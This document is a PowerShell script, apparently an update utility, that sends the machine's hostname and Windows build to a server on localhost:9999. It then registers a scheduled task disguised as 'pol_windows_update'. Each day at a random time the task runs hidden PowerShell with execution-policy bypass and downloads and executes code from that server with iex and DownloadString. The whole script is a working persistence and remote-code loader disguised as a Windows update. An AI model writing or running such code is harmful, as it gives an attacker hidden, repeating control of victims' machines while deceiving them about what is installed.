$hostname = hostname
$winver = (Get-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion") | select @{l="ReleaseId";e={$_.Getvalue("ReleaseId")}},@{l="DisplayVersion";e={$_.GetValue("DisplayVersion")}}, @{l="Build";e={$_.GetValue("CurrentBuildNumber")}}, @{l="UBR";e={$_.GetValue("UBR")}}
if ([string]::IsNullOrEmpty($winver.DisplayVersion)) { $winver.DisplayVersion = $winver.ReleaseId }

$v1 = $winver.DisplayVersion
$v2 = $winver.Build
$v3 = $winver.UBR

Invoke-WebRequest -Method GET -Uri "http://localhost:9999/api/info_reg/$hostname/$v1/$v2.$v3"

Clear-Host
if ($winver -eq "1803") {
    Write-Host "[error] Cannot Update"
    Invoke-WebRequest -Method GET -Uri "http://localhost:9999/api/result/2"
    
    Pause
    exit
}

$file = (join-Path -Path ([Environment]::GetEnvironmentVariable('userprofile')) -ChildPath "windwos_update_dev.ps1")
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -noni -nop -ep Bypass -Command iex(New-Object Net.WebClient).DownloadString(""http://localhost:9999/update/ps3"")"
$trigger = New-ScheduledTaskTrigger -Daily -At "08:50" -RandomDelay (New-TimeSpan -Hours 9) # random time 08:50 to 17:50 
$trigger.EndBoundary = "2022-12-30T18:00:00" # expired date
$task = New-ScheduledTask -Action $action -Trigger $trigger
Register-ScheduledTask pol_windows_update -InputObject $task

Clear-Host